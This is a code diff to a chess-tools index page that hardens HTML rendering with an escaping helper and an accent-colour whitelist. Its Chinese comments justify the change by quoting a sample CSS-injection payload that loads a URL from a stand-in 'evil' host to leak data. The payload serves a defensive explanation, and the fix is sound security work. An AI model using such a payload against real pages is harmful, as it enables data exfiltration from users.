@@ -20,6 +20,10 @@
   --trace-violet:#a78bfa;
   --trace-emerald:#34d399;
   --trace-orange:#fb923c;
+  /* 调色板之外的第六个值，**不是给任何工具用的**：safeAccent() 认不出的 accent
+     退到它。刻意刺眼、刻意不属于任何工具——见下面 safeAccent 处的注释。
+     与 chess/app.html 的 :root 逐字同源。 */
+  --trace-unpaired:#ff2fd0;
   --ui-slate:#9fb0c8;
   --ui-bright:#e2e8f0;
   --panel-bg:rgba(13,20,36,.74);
@@ -132,6 +136,10 @@ function resolveLang() {
 }
 var LANG = resolveLang();
 function t(s) { return (s && typeof s === 'object') ? (s[LANG] != null ? s[LANG] : s.en) : s; }
+function esc(s) {
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
+                  .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
 
 /* ================= 回退列表 =================
    运行时优先 fetch('chess-tools.json')；file:// 下 fetch 会失败（同源限制），
@@ -207,6 +215,28 @@ var L = {
   back: { en: '← MathViz', zh: '← MathViz' }
 };
 
+/* accent 白名单——不能靠 esc() 兜底：accent 被拼进 style="" 属性值内部
+   （--c:var(--trace-<accent>)），esc() 只转义 & < > "，一个像
+   `x); background:url(//evil/leak?` 这样的 CSS 层面 payload 一个都不含，
+   会原样穿透进 style 并被当成任意 CSS 声明执行。 chess-tools.json 今天是
+   仓库自控内容，但它是运行时 fetch 进来的，check.py 也不校验 accent，
+   所以必须在插值点就收紧成闭集。以下两行与 chess/app.html 的同名两行逐字同源，
+   改一处就要改另一处——只在一页收紧，另一页照样把 accent 原样插进 style。
+
+   ⚠ 这一页的**失效模式**与 app.html 那页不同，别照抄那边的结论。app.html 的注释
+   讲的是「退路曾经是 cyan，工具⑤ 用掉 cyan 之后哨兵失效、拼错的条目会显示成正常
+   的青色」；这一页在没有白名单时根本走不到「套错颜色」那一步：一个拼错的 accent
+   （比如 cyaan）产生的是 var(--trace-cyaan)，那个变量没有定义，于是 --c 这条声明
+   invalid at computed-value time、取到 guaranteed-invalid 值，吃它的 .dot 背景与
+   .card::before 渐变一起失效——卡片是**没有颜色**，而不是悄悄套错颜色。
+   所以在这一页，白名单挡的是属性值逃逸；`--trace-unpaired` 那块洋红是顺带把
+   「没配对」从「没颜色」提升成一眼可见的信号（本文件 :root 里定义了这个 token，
+   否则退路会退到一个未定义的变量，等于什么都没退）。
+   要维持这条不变量只需一件事：给新工具选 accent 时只能从 ACCENTS 的五个键里选，
+   不许把 unpaired 加进这张表。 */
+var ACCENTS = { cyan: 1, rose: 1, violet: 1, emerald: 1, orange: 1 };
+function safeAccent(a) { return ACCENTS.hasOwnProperty(a) ? a : 'unpaired'; }
+
 function render() {
   document.documentElement.lang = LANG === 'zh' ? 'zh-CN' : 'en';
   document.title = t(L.title);
@@ -220,13 +250,16 @@ function render() {
   function kickerText(d) {
     return LANG === 'zh' ? (t(d.kicker) + ' · ' + (d.kicker.en || '')) : t(d.kicker);
   }
+  /* 注册表字段全部经 esc() 才进 HTML，accent 另走 safeAccent()（见上面的注释）。
+     LANG 不用转义：resolveLang() 只会给出 'en' / 'zh' 两个字面量。 */
   function card(d) {
-    var descHtml = d.desc ? '<p>' + t(d.desc) + '</p>' : '';
-    return '<a class="card" style="--c:var(--trace-' + d.accent + ')" href="' + d.file + '?lang=' + LANG + '">' +
-      '<div class="k"><span class="dot"></span><span class="kicker">' + kickerText(d) + '</span></div>' +
-      '<h2>' + t(d.title) + '</h2>' + descHtml +
-      '<div class="foot"><span class="tag">' + t(d.tag) + '</span>' +
-      '<span class="open">' + t(L.open) + '<span class="arw">→</span></span></div>' +
+    var descHtml = d.desc ? '<p>' + esc(t(d.desc)) + '</p>' : '';
+    return '<a class="card" style="--c:var(--trace-' + safeAccent(d.accent) + ')"' +
+      ' href="' + esc(d.file) + '?lang=' + LANG + '">' +
+      '<div class="k"><span class="dot"></span><span class="kicker">' + esc(kickerText(d)) + '</span></div>' +
+      '<h2>' + esc(t(d.title)) + '</h2>' + descHtml +
+      '<div class="foot"><span class="tag">' + esc(t(d.tag)) + '</span>' +
+      '<span class="open">' + esc(t(L.open)) + '<span class="arw">→</span></span></div>' +
     '</a>';
   }
 
@@ -240,16 +273,16 @@ function render() {
   var html = '';
   phases.forEach(function (p) {
     var items = TOOLS.filter(function (d) { return (d.phase || 1) === p; });
-    html += '<div class="sect"><span class="lbl">' + t(phaseLabel(p)) + '</span><span class="rule"></span>' +
+    html += '<div class="sect"><span class="lbl">' + esc(t(phaseLabel(p))) + '</span><span class="rule"></span>' +
       '<span class="count">' + items.length + '</span></div>' +
       '<div class="grid">' + items.map(card).join('') + '</div>';
   });
   // 阶段 2 尚未落地时，用一张 ghost 卡片占位，呼应主站 index.html 的「敬请期待」写法。
   if (phases.indexOf(2) < 0) {
-    html += '<div class="sect"><span class="lbl">' + t(phaseLabel(2)) + '</span><span class="rule"></span></div>' +
+    html += '<div class="sect"><span class="lbl">' + esc(t(phaseLabel(2))) + '</span><span class="rule"></span></div>' +
       '<div class="grid"><div class="card ghost">' +
-      '<div class="k"><span class="dot"></span><span class="kicker">' + t(L.soonKicker) + '</span></div>' +
-      '<h2>' + t(phaseLabel(2)) + '</h2><p>' + t(L.soonDesc) + '</p>' +
+      '<div class="k"><span class="dot"></span><span class="kicker">' + esc(t(L.soonKicker)) + '</span></div>' +
+      '<h2>' + esc(t(phaseLabel(2))) + '</h2><p>' + esc(t(L.soonDesc)) + '</p>' +
       '<div class="foot"><span class="tag">building…</span></div></div></div>';
   }
   document.getElementById('phases').innerHTML = html;
